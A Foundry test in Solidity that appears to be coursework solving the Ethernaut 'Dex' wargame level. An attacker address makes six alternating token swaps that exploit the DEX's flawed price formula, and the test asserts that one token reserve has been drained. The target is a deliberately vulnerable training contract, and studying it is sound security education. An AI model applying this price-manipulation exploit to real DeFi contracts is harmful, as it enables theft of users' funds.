// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Dex } from "../../contracts/Week7/Ethernaut_Dex1.sol";
import { SwappableToken } from "../../contracts/Week7/Ethernaut_Dex1.sol";


contract Ethernaut_Dex1 is Test {
  Dex dex;
  SwappableToken token1;
  SwappableToken token2;
  address attacker = address(1234);

  function setUp() external {
    dex = new Dex();
    token1 = new SwappableToken(address(dex), "Token1", "TK1", 1000);
    token2 = new SwappableToken(address(dex), "Token2", "TK2", 1000);

    dex.setTokens(address(token1), address(token2));
    token1.approve(address(dex), 1000);
    token2.approve(address(dex), 1000);

    dex.addLiquidity(address(token1), 100);
    dex.addLiquidity(address(token2), 100);

    token1.approve(attacker, 1000);
    token2.approve(attacker, 1000);
    token1.transfer(attacker, 10);
    token2.transfer(attacker, 10);
  }

  function test_attack() external {
    vm.startPrank(attacker);
    token1.approve(address(dex), 1000);
    token2.approve(address(dex), 1000);

    // uint256 token1Balance = token1.balanceOf(attacker);
    // uint256 token2Balance = token2.balanceOf(attacker);

    dex.swap(address(token1), address(token2), 10);
    dex.swap(address(token2), address(token1), 20);
    dex.swap(address(token1), address(token2), 24);
    dex.swap(address(token2), address(token1), 30);
    dex.swap(address(token1), address(token2), 41);
    dex.swap(address(token2), address(token1), 45);

    // uint256 token1BalanceAfter = token1.balanceOf(attacker);
    // uint256 token2BalanceAfter = token2.balanceOf(attacker);

    // uint256 token1BalanceAfterDex = token1.balanceOf(address(dex));
    // uint256 token2BalanceAfterDex = token2.balanceOf(address(dex));

    // console.log("token1Balance", token1Balance);
    // console.log("token2Balance", token2Balance);
    // console.log("token1BalanceAfter", token1BalanceAfter);
    // console.log("token2BalanceAfter", token2BalanceAfter);
    // console.log("token1BalanceAfterDex", token1BalanceAfterDex);
    // console.log("token2BalanceAfterDex", token2BalanceAfterDex);

    require(token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0, "Dex should have no tokens");
  }

}
